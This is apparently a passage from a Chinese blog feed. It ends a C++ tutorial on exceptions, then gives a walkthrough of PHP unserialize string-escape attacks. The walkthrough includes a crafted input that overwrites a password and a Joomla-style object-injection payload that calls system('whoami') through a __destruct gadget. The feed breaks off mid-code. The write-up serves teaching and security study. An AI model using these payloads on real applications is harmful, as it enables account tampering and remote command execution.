title="局部类"></a>局部类</h2><p>在一个函数内部定义的类，称为局部类。</p><p><strong>局部类的特点：</strong></p><ul><li>作用域仅限于所在的函数内部</li><li>其所有的成员必须定义在类内部，不允许定义static成员变量</li><li>成员函数不能直接访问函数的局部变量（static变量除外）</li></ul><h1 id="其他语法"><a href="#其他语法" class="headerlink" title="其他语法"></a>其他语法</h1><h2 id="运算符重载"><a href="#运算符重载" class="headerlink" title="运算符重载"></a>运算符重载</h2><p>运算符重载（操作符重载）：可以为运算符增加一些新的功能。</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175557.png" alt="image-20201120215046404"></p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175558.png" alt="image-20201120215151814"></p><p>全局函数、成员函数都支持运算符重载。</p><h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><ul><li>异常是一种在程序运行过程中可能会发生的错误（比如内存不够）</li><li>异常没有被处理，会导致程序终止</li></ul><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175559.png" alt="image-20201120231614967"></p><p>throw异常后，会在当前函数中查找匹配的catch，找不到就终止当前函数代码，去上一层函数中查找。如果最终都找不到匹配的catch，整个程序就会终止。</p><p>例：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;int divide(int v1, int v2) &#123;if (v2 &#x3D;&#x3D; 0)&#123;throw &quot;不能除以0&quot;;&#125;return v1 &#x2F; v2;&#125;int main() &#123;try &#123;int a &#x3D; 10;int b &#x3D; 0;divide(a, b);&#125;catch (...) &#123;cout &lt;&lt; &quot;运算错误&quot; &lt;&lt; endl;&#125;return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175600.png" alt="image-20201121000503772"></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;int divide(int v1, int v2) &#123;if (v2 &#x3D;&#x3D; 0)&#123;throw &quot;不能除以0&quot;;&#125;return v1 &#x2F; v2;&#125;int main() &#123;try &#123;int a &#x3D; 10;int b &#x3D; 0;divide(a, b);&#125;catch (const char * exception) &#123;cout &lt;&lt; &quot;运算错误:&quot; &lt;&lt; exception &lt;&lt; endl;&#125;return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175601.png" alt="image-20201121171409598"></p><p><strong>自定义异常类型</strong></p><p>例：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;class Exception &#123;public:virtual const char * what() &#x3D; 0;&#125;;class DivideException : public Exception &#123;public:const char* what() &#123;return &quot;不能除以0&quot;;&#125;&#125;;class AddException : public Exception &#123;public:const char* what() &#123;return &quot;加法有问题&quot;;&#125;&#125;;int divide(int v1, int v2) &#123;if (v2 &#x3D;&#x3D; 0)&#123;throw DivideException();&#125;return v1 &#x2F; v2;&#125;int main() &#123;try &#123;int a &#x3D; 10;int b &#x3D; 0;divide(a, b);&#125;catch (DivideException exception) &#123;cout &lt;&lt; &quot;产生了异常:&quot; &lt;&lt; exception.what() &lt;&lt; endl;&#125;return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175602.png" alt="image-20201121173908311"></p><p><strong>标准异常（std）</strong></p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175603.png" alt="image-20201121172655264"></p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175604.png" alt="image-20201121172706592"></p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175605.png" alt="image-20201121173102248"></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> c++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅析php反序列化字符串逃逸</title>
      <link href="2020/09/29/php-unserialize-Escape-character/"/>
      <url>2020/09/29/php-unserialize-Escape-character/</url>
      
        <content type="html"><![CDATA[<h2 id="php序列化与反序列化"><a href="#php序列化与反序列化" class="headerlink" title="php序列化与反序列化"></a>php序列化与反序列化</h2><p>我们在开发的过程中常常遇到需要把对象或者数组进行序列号存储，反序列化输出的情况。特别是当需要把数组存储到mysql数据库中时，我们时常需要将数组进行序列号操作。</p><p>序列化（串行化）：是将变量转换为可保存或传输的字符串的过程；<br>反序列化（反串行化）：就是在适当的时候把这个字符串再转化成原来的变量使用。</p><p>常见的php序列化和反序列化函数有：serialize，unserialize。</p><p>serialize() —&gt; 函数用于序列化对象或数组，并返回一个字符串。如下:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$sites</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'t1'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tt2'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ttt3'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$serialized_data</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$sites</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token variable">$serialized_data</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果为：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token argument-name">i</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"t1"</span><span class="token punctuation">;</span><span class="token argument-name">i</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"tt2"</span><span class="token punctuation">;</span><span class="token argument-name">i</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"ttt3"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>各个字符的意义 —&gt; o表示对象,a表示数组,s表示字符,i表示数字<br>a:3 表示有三个数组<br>i:0,表示第一个数组，s:2:”t1”,表示第一个数组是字符，2表示有两个字符，为”t1”<br>i:1,表示第二个数组，s:3:”tt2”,表示第二个数组是字符，3表示有三个字符，为”tt2”<br>i:2,表示第三个数组，s:4:”ttt3”,表示第三个数组是字符，4表示有三个字符，为”ttt3”</p><p>再举一个例子：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>Classtest<span class="token punctuation">&#123;</span>  <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token operator">=</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token variable">$bb</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token variable">$ccc</span><span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$r</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果为：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"bb"</span><span class="token punctuation">;</span><span class="token argument-name">i</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"ccc"</span><span class="token punctuation">;</span><span class="token argument-name">b</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中各个字符的含义是：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20201012121005.png" alt="20201012121005"></p><h2 id="php反序列化的几个特性"><a href="#php反序列化的几个特性" class="headerlink" title="php反序列化的几个特性"></a>php反序列化的几个特性</h2><p>1.类中不存在的属性也会进行反序列化；<br>2.对于类和数组的反序列化，以<code>;</code>作为字段的分隔，以<code>&#125;</code>作为结尾，若在<code>&#125;</code>后再加数据将直接被丢弃；<br>3.反序列化按照严格的格式进行。</p><p>由于PHP反序列化中的字符逃逸只用到了第二个特性，所以重点看下第二个特性。</p><p>当我们反序列这个字符串<code>a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;</code>,得到的结果为：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"peri0d"</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"aaaaa"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当把字符串改为<code>a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;i:1;s:5:&quot;aaaaa&quot;;</code>时，反序列化会得到同样的结果：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20201012125453.png" alt="20201012125453"></p><p>给出一个问题,代码如下，如何在username可控的情况下将密码修改为<code>123456</code>?</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'yy'</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"peri0d"</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"aaaaa"</span><span class="token punctuation">;</span><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析：<br>正常情况下序列化的结果为：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token argument-name">i</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"peri0d"</span><span class="token punctuation">;</span><span class="token argument-name">i</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"aaaaa"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果把username改为peri0dxx，序列化结果就变成了：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token argument-name">i</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"peri0dyyyy"</span><span class="token punctuation">;</span><span class="token argument-name">i</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"aaaaa"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这时候由于filter函数的关系，<code>peri0dyyyy</code>明明为10个字符，但是序列化字符串中却显示为8个字符，那么反序列化时必定会失败</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20201012143141.png" alt="20201012143141"></p><p>那么如何才能修改密码呢？依据第二条规则，只需要把序列化后的字符串改为<code>a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;s:6:&quot;123456&quot;;&#125;i:1;s:5:&quot;aaaaa&quot;;&#125;</code>,那么在反序列化之后就可以成功修改密码：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20201012143456.png" alt="20201012143456"></p><p>目标明确：<br>1.输入可控的username,<br>2.利用filter函数将序列化后的字符串改为如下格式的<br><code>a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;s:6:&quot;123456&quot;;&#125;i:1;s:5:&quot;aaaaa&quot;;&#125;</code><br>3.经过反序列化之后，忽律第一个<code>&#125;</code>后面的字符，使得<code>123456</code>逃逸出来成为我们的密码。</p><p>经过计算<code>&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code>共有20个字符，加上<code>peri0d</code>共26个字符</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20201012164925.png" alt="20201012164925"></p><p>如果把peri0d改为peri0dxx后经过filter函数就变成了peri0dyyyy,这是总共就为28个字符。</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20201012165104.png" alt="20201012165104"></p><p>此时明显不能正常反序列化，那么就需要增加<code>x</code>直到可以正确反序列化，经过测试当增加到20个<code>x</code>时成功：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20201012165404.png" alt="20201012165404"></p><p><code>123456</code>成功逃逸出来修改了密码。</p><h2 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h2><p>这个例子是Joomla的逃逸，下面是有人写出的一个简易的Joomla处理反序列化的机制：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">evil</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'*'</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"dbs.txt"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"dbs.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'*'</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$r</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"dbs.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"dbs.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"     "</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$password</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上述代码的大致意思是当向dbs.txt写如数据时会将<code>chr(0).&#39;*&#39;.chr(0)</code>替换为<code>\0\0\0</code>,读数据时则相反。</p><p>漏洞点在<code>str_replace(chr(0).&#39;*&#39;.chr(0), &#39;\0\0\0&#39;, $data)</code>，因为joomla会将数据存储到mysql数据库中，protected变量序列化之后会有<code>\x00*\x00</code>，那么mysql数据库不能存储空字符，所以在写入数据库之前经过替换，会将三个字符替换成六个字符，在反序列化时，会在读取的处理回来，这就导致存在逃逸。</p><p>反序列化读取的时候将会将六位字符<code>\0\0\0</code>替换成三位字符<code>chr(0)*chr(0)</code>,因此字符串前面的s肯定是固定的，那么<code>s</code>对应的字符串变少以后将会吞掉其他属性的字符，那么如果我们精心算好吞掉的字符长度，并且能够控制被吞掉属性的内容，那么就能够注入对象，从而反序列化其他类</p><p>正常情况下序列化的结果为：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"User"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"123456"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当一个对象销毁时会执行<code>__destruct()</code>函数，我们的目标是构造payload注入到evil类中进而执行<code>system()</code>函数。</p><p>所以payload为<code>s:2:&quot;rs&quot;;O:4:&quot;evil&quot;:1:&#123;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;</code></p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20201013120427.png" alt="20201013120427"></p><p>比如如上所示，此时我们要注入的对象为evil，此时username和password的值我们可控，那么我们可以在username中注入<code>\0</code>，来吞掉password的值，比如</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20201012182813.png" alt="20201012182813"></p><p>首先确定要吞掉的字符串长度：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"User"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"123456"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>要吞掉的字符串长度为：<code>“;s:8:&quot;password&quot;;s:6:“123456</code>共28个字符。</p><p>因为注入的payload长度为肯定是个二位数，所以第二个s后面肯定为二位数，所以要吞掉的字符串长度至少为29个字符。</p><p>现在就是需要在username中加入<code>\0</code>判断经过read函数出来过后的长度，由于每加入一组<code>\0\0\0</code>就可以吞掉3个字符。</p><p>假设构造username为<code>\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0</code><br>其长度为54。</p><p>经过read函数处理后其长度变为了27</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20201013120940.png" alt="20201013120940"></p><p>即可吞掉27个字符，但是上面计算需要吞掉29个字符，由于吞掉的字符长度总是3的倍数，所以最方便的办法还是将密码改为1234，这样需要吞掉的字符串长度就变成了27。</p><p>接下里就可以构造payload了。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$username</span> <span class="token operator">=</span> ‘\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>’<span class="token punctuation">;</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'s:2:"rs";O:4:"evil":1:&#123;s:3:"cmd";s:6:"whoami";&#125;'</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'1234";'</span><span class="token operator">.</span><span class="token variable">$payload</span><span class="token operator">.</span><span class="token string double-quoted-string">"&#125;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$password</span><span class="token punctuation">;</span></span><span aria-hidden="true" 